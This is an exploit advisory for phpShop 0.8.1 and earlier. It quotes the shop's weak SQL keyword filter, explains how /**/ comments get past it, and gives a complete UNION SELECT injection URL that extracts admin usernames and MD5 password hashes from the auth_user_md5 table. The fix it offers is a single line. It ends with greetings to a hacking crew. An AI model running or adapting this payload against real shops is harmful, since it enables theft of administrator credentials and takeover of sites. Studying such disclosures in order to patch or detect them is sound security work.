phpShop <= 0.8.1 Remote SQL injection / Filter Bypass Vulnerabilities
=====================================================================



Vendor  : PHPShop
Webiste : http://www.phpshop.org
Version : v0.8.1
Author: the redc0ders 
Condition: magic_quote_gpc = off , in php.ini setting

Details :
==========

  Vulnerable Code in index.php near lines 98 - 128
   [code]
 // basic SQL inject detection
   $my_insecure_array = array(&#039;keyword&#039; => $_REQUEST[&#039;keyword&#039;],
                  &#039;category_id&#039; => $_REQUEST[&#039;category_id&#039;],
                  &#039;product_id&#039; => $_REQUEST[&#039;product_id&#039;],
                  &#039;user_id&#039; => $_REQUEST[&#039;user_id&#039;],
                  &#039;user_info_id&#039; => $_REQUEST[&#039;user_info_id&#039;],
                  &#039;page&#039; => $_REQUEST[&#039;page&#039;],
                  &#039;func&#039; => $_REQUEST[&#039;func&#039;]);
                  
   while(list($key,$value)=each($my_insecure_array)) {
      if (stristr($value,&#039;FROM &#039;) ||
          stristr($value,&#039;UPDATE &#039;) ||
          stristr($value,&#039;WHERE &#039;) ||
          stristr($value,&#039;ALTER &#039;)  ||
          stristr($value,&#039;SELECT &#039;)  ||
          stristr($value,&#039;SHUTDOWN &#039;) ||
          stristr($value,&#039;CREATE &#039;) ||
          stristr($value,&#039;DROP &#039;) ||
          stristr($value,&#039;DELETE FROM&#039;) ||
          stristr($value,&#039;script&#039;) ||
          stristr($value,&#039;<>&#039;) ||
          stristr($value,&#039;=&#039;) ||
          stristr($value,&#039;SET &#039;))
              die(&#039;Please provide a permitted value for &#039;.$key);
   }
 [/code]

  The script check if $my_insecure_array contain &#039;SELECT &#039;,&#039;UPDATE &#039; ...etc 

  so WORD+space, and this can be easily bypassed using comments like 
  POC : select/**/input1,input2...

Exemple to inject admin username and md5 hash password : http://website/phpshop/?page=shop/flypage&product_id=-3&#039;+UNION+select/**/null,null,null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,username/**/from/**/auth_user_md5/*


  
  Solution :
 simply remove spaces in stristr() function or activate magic_quotes_gpc in php.ini
 
 Greetz : Hacker1 - ToXiC350 - S4MI - Miyyet - Pynsso - Amigo_BM and All Moroccan Hackers =)

>From Morocco : JIB L3EZZ WELLA K7AZZ !




